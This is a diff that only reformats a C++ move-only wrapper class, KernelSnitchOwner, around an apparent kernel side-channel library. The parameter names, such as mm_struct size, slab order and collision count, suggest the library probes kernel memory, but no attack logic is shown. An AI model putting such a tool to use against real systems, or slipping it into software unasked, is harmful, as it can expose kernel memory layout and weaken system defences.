-class KernelSnitchOwner final {
- public:
-  KernelSnitchOwner() noexcept = default;
-  ~KernelSnitchOwner() noexcept { reset(); }
+    class KernelSnitchOwner final {
+    public:
+        KernelSnitchOwner() noexcept = default;
 
-  KernelSnitchOwner(const KernelSnitchOwner &) = delete;
-  KernelSnitchOwner &operator=(const KernelSnitchOwner &) = delete;
+        ~KernelSnitchOwner() noexcept { reset(); }
 
-  KernelSnitchOwner(KernelSnitchOwner &&other) noexcept
-      : context_(std::exchange(other.context_, nullptr)) {}
+        KernelSnitchOwner(const KernelSnitchOwner &) = delete;
 
-  KernelSnitchOwner &operator=(KernelSnitchOwner &&other) noexcept {
-    if (this != &other) {
-      reset();
-      context_ = std::exchange(other.context_, nullptr);
-    }
-    return *this;
-  }
+        KernelSnitchOwner &operator=(const KernelSnitchOwner &) = delete;
 
-  [[nodiscard]] static KernelSnitchOwner create(size_t mm_struct_sz,
-                                                size_t mm_slab_order,
-                                                size_t thread_cnt,
-                                                size_t collision_cnt,
-                                                size_t verbose,
-                                                size_t pin_cpu) noexcept {
-    return KernelSnitchOwner(kernelsnitch_context_init(
-        mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
-        pin_cpu));
-  }
+        KernelSnitchOwner(KernelSnitchOwner &&other) noexcept
+            : context_(std::exchange(other.context_, nullptr)) {
+        }
 
-  [[nodiscard]] KernelSnitchContext *get() const noexcept { return context_; }
-  [[nodiscard]] bool valid() const noexcept { return context_ != nullptr; }
+        KernelSnitchOwner &operator=(KernelSnitchOwner &&other) noexcept {
+            if (this != &other) {
+                reset();
+                context_ = std::exchange(other.context_, nullptr);
+            }
+            return *this;
+        }
 
-  void find_collisions() const {
-    kernelsnitch_context_find_collisions(context_);
-  }
-  [[nodiscard]] bool has_collisions() const {
-    return kernelsnitch_context_has_collisions(context_) != 0;
-  }
-  [[nodiscard]] int scan() const {
-    return kernelsnitch_context_scan(context_);
-  }
-  [[nodiscard]] size_t result() const {
-    return kernelsnitch_context_result(context_);
-  }
+        [[nodiscard]] static KernelSnitchOwner create(size_t mm_struct_sz,
+                                                      size_t mm_slab_order,
+                                                      size_t thread_cnt,
+                                                      size_t collision_cnt,
+                                                      size_t verbose,
+                                                      size_t pin_cpu) noexcept {
+            return KernelSnitchOwner(kernelsnitch_context_init(
+                mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
+                pin_cpu));
+        }
 
-  void reset() noexcept {
-    if (context_) {
-      kernelsnitch_context_destroy(context_);
-      context_ = nullptr;
-    }
-  }
+        [[nodiscard]] KernelSnitchContext *get() const noexcept { return context_; }
+        [[nodiscard]] bool valid() const noexcept { return context_ != nullptr; }
 
- private:
-  explicit KernelSnitchOwner(KernelSnitchContext *context) noexcept
-      : context_(context) {}
+        void find_collisions() const {
+            kernelsnitch_context_find_collisions(context_);
+        }
 
-  KernelSnitchContext *context_ = nullptr;
-};
+        [[nodiscard]] bool has_collisions() const {
+            return kernelsnitch_context_has_collisions(context_) != 0;
+        }
 
-}  // namespace ghostlock
+        [[nodiscard]] int scan() const {
+            return kernelsnitch_context_scan(context_);
+        }
+
+        [[nodiscard]] size_t result() const {
+            return kernelsnitch_context_result(context_);
+        }
+
+        void reset() noexcept {
+            if (context_) {
+                kernelsnitch_context_destroy(context_);
+                context_ = nullptr;
+            }
+        }
+
+    private:
+        explicit KernelSnitchOwner(KernelSnitchContext *context) noexcept
+            : context_(context) {
+        }
+
+        KernelSnitchContext *context_ = nullptr;
+    };
+} // namespace ghostlock
